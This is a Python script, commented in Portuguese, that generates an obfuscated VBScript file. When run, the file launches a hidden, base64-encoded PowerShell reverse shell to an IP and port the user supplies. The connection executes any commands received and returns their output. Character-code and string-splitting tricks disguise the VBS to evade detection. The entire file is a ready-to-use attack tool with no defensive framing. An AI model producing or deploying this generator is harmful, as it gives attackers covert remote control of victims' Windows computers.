import base64

def generate_vbs_reverse_shell(ip, port):
    # Gerar o código PowerShell
    ps_code = f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    
    # Converter para Base64
    ps_code_bytes = ps_code.encode('utf-16le')
    ps_base64 = base64.b64encode(ps_code_bytes).decode('utf-8')
    
    # Gerar o código VBS ofuscado CORRIGIDO
    vbs_code = f''''
' Script VBS ofuscado gerado automaticamente (versão corrigida)
Dim {chr(102)}{chr(117)}{chr(110)}{chr(99)}: {chr(102)}{chr(117)}{chr(110)}{chr(99)} = Chr(37)
Dim {chr(113)}: {chr(113)} = Chr(34)
Execute("{chr(83)}{chr(101)}{chr(116)} {chr(111)}{chr(98)}{chr(106)}{chr(83)}{chr(104)}{chr(101)}{chr(108)}{chr(108)} = C" & "reateObject(" & {chr(113)} & "W" & "Script.Shell" & {chr(113)} & ")" & vbCrLf & _
"{chr(111)}{chr(98)}{chr(106)}{chr(83)}{chr(104)}{chr(101)}{chr(108)}{chr(108)}.Run " & {chr(113)} & "powershell -nop -w hidden -e {ps_base64}" & {chr(113)})
'''
    
    return vbs_code

def main():
    print("Gerador de Shell Reversa VBS Ofuscada (CORRIGIDO)")
    ip = input("Digite o IP de destino: ")
    port = input("Digite a porta: ")
    
    vbs_code = generate_vbs_reverse_shell(ip, port)
    
    filename = f"reverse_{ip}_{port}.vbs"
    with open(filename, 'w') as file:
        file.write(vbs_code)
    
    print(f"\nArquivo VBS gerado com sucesso: {filename}")
    print("Tamanho do script:", len(vbs_code), "bytes")

if __name__ == "__main__":
    main()